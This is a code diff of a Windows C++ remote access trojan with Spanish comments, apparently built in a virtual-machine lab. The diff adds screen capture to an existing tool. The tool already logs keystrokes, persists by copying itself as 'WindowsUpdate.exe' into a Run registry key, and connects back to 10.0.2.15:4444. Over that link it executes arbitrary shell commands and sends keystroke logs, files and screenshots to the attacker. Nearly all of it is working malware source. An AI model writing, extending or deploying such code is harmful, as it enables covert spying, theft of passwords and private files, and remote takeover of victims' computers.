@@ -7,9 +7,14 @@
 #include <thread>
 #include <fstream>  
 #include <vector>   
+#include <gdiplus.h> 
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "gdiplus.lib") 
+#pragma comment(lib, "gdi32.lib")   
+
+using namespace Gdiplus; 
 
 std::string registroTeclas = "";
 
@@ -18,31 +23,27 @@ std::string obtenerInfoSistema() {
     char pcName[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD pcSize = sizeof(pcName);
     GetComputerNameA(pcName, &pcSize);
-
     char userName[256];
     DWORD userSize = sizeof(userName);
     GetUserNameA(userName, &userSize);
-
     return std::string(pcName) + "|" + std::string(userName);
 }
 
 // --- 2. FUNCIÓN PARA ENVIAR ARCHIVOS ---
 void enviarArchivo(SOCKET sock, std::string ruta) {
     std::ifstream file(ruta, std::ios::binary | std::ios::ate);
-    
     if (!file.is_open()) {
         std::string err = "ERROR: No se pudo abrir el archivo.\n";
         send(sock, err.c_str(), (int)err.length(), 0);
         return;
     }
-
     std::streamsize size = file.tellg();
     file.seekg(0, std::ios::beg);
-
+    
     std::string header = "FILE_SIZE:" + std::to_string(size);
     send(sock, header.c_str(), (int)header.length(), 0);
-
-    Sleep(300);
+    
+    Sleep(300); // Pausa para sincronización con Python
 
     std::vector<char> buffer(size);
     if (file.read(buffer.data(), size)) {
@@ -51,15 +52,72 @@ void enviarArchivo(SOCKET sock, std::string ruta) {
     file.close();
 }
 
-// --- 3. FUNCIONES DEL KEYLOGGER ---
+// --- 3. FUNCIONES PARA CAPTURA DE PANTALLA ---
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT num = 0, size = 0;
+    GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    GetImageEncoders(num, size, pImageCodecInfo);
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+    free(pImageCodecInfo);
+    return -1;
+}
+
+void capturarPantalla(SOCKET sock) {
+    GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
+    std::string rutaImg = std::string(getenv("TEMP")) + "\\scr.jpg";
+
+    {   // --- BLOQUE DE SEGURIDAD {} ---
+        // Al encerrar esto en llaves, obligamos a que 'bitmap' se destruya 
+        // y libere el archivo scr.jpg ANTES de intentar enviarlo.
+        int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+        int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+        int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+        HDC hScreenDC = GetDC(NULL);
+        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, w, h);
+        SelectObject(hMemoryDC, hBitmap);
+        BitBlt(hMemoryDC, 0, 0, w, h, hScreenDC, x, y, SRCCOPY);
+
+        Bitmap bitmap(hBitmap, NULL);
+        CLSID clsid;
+        GetEncoderClsid(L"image/jpeg", &clsid);
+        
+        std::wstring wruta(rutaImg.begin(), rutaImg.end());
+        bitmap.Save(wruta.c_str(), &clsid, NULL);
+
+        DeleteObject(hBitmap);
+        DeleteDC(hMemoryDC);
+        ReleaseDC(NULL, hScreenDC);
+    } 
+
+    GdiplusShutdown(gdiplusToken);
+
+    // Ahora el archivo está libre y podemos enviarlo/borrarlo sin errores
+    enviarArchivo(sock, rutaImg);
+    DeleteFileA(rutaImg.c_str());
+}
+
+// --- 4. KEYLOGGER ---
 LRESULT CALLBACK HookTeclado(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
-        DWORD vkCode = pKeyBoard->vkCode;
-        if (vkCode == VK_BACK) registroTeclas += "[BACKSPACE]";
-        else if (vkCode == VK_RETURN) registroTeclas += "\n";
-        else if (vkCode == VK_SPACE) registroTeclas += " ";
-        else if (vkCode >= 0x30 && vkCode <= 0x5A) registroTeclas += (char)vkCode; 
+        if (pKeyBoard->vkCode == VK_BACK) registroTeclas += "[BACKSPACE]";
+        else if (pKeyBoard->vkCode == VK_RETURN) registroTeclas += "\n";
+        else if (pKeyBoard->vkCode == VK_SPACE) registroTeclas += " ";
+        else if (pKeyBoard->vkCode >= 0x30 && pKeyBoard->vkCode <= 0x5A) registroTeclas += (char)pKeyBoard->vkCode; 
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
@@ -74,13 +132,12 @@ void IniciarKeylogger() {
     UnhookWindowsHookEx(hhkLowLevelKybd);
 }
 
-// --- 4. PERSISTENCIA Y RCE ---
+// --- 5. PERSISTENCIA Y RCE ---
 void instalarPersistencia() {
     char rutaPropia[MAX_PATH];
     GetModuleFileNameA(NULL, rutaPropia, MAX_PATH);
     std::string rutaDestino = std::string(getenv("APPDATA")) + "\\WindowsUpdate.exe";
     CopyFileA(rutaPropia, rutaDestino.c_str(), FALSE);
-
     HKEY hKey;
     RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
     RegSetValueExA(hKey, "ServicioTecnicoWindows", 0, REG_SZ, (BYTE*)rutaDestino.c_str(), (DWORD)rutaDestino.length());
@@ -91,35 +148,28 @@ std::string ejecutarComando(const char* cmd) {
     std::array<char, 128> buffer;
     std::string resultado;
     std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
-    if (!pipe) return "Error al ejecutar.\n";
-    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
-        resultado += buffer.data();
-    }
+    if (!pipe) return "Error.\n";
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) resultado += buffer.data();
     return resultado;
 }
 
-// --- 5. MAIN ---
+// --- 6. MAIN ---
 int main() {
     instalarPersistencia();
-
-    std::thread hiloKeylogger(IniciarKeylogger);
-    hiloKeylogger.detach(); 
+    std::thread(IniciarKeylogger).detach(); 
 
     WSADATA wsaData;
     SOCKET sock;
     struct sockaddr_in serv_addr;
-    char buffer[4096] = {0};
+    char buffer[4096];
 
     WSAStartup(MAKEWORD(2,2), &wsaData);
     sock = socket(AF_INET, SOCK_STREAM, 0);
-
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(4444);
     serv_addr.sin_addr.s_addr = inet_addr("10.0.2.15"); 
 
-    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-        return -1;
-    }
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) return -1;
 
     std::string identidad = obtenerInfoSistema();
     send(sock, identidad.c_str(), (int)identidad.length(), 0);
@@ -133,23 +183,21 @@ int main() {
 
         if (comando == "dump") {
             if (registroTeclas.empty()) send(sock, "Buffer vacio.\n", 14, 0);
-            else {
-                send(sock, registroTeclas.c_str(), (int)registroTeclas.length(), 0);
-                registroTeclas = ""; 
-            }
+            else { send(sock, registroTeclas.c_str(), (int)registroTeclas.length(), 0); registroTeclas = ""; }
         } 
+        else if (comando == "screenshot") {
+            capturarPantalla(sock);
+        }
         else if (comando.find("download ") == 0) {
-            std::string ruta = comando.substr(9);
-            enviarArchivo(sock, ruta);
+            enviarArchivo(sock, comando.substr(9));
         }
         else {
             std::string respuesta = ejecutarComando(comando.c_str());
-            if(respuesta.empty()) respuesta = "Comando ejecutado.\n";
             send(sock, respuesta.c_str(), (int)respuesta.length(), 0);
         }
-    } // Cierre del while
+    }
 
     closesocket(sock);
     WSACleanup();
     return 0;
-} // Cierre del main
+}
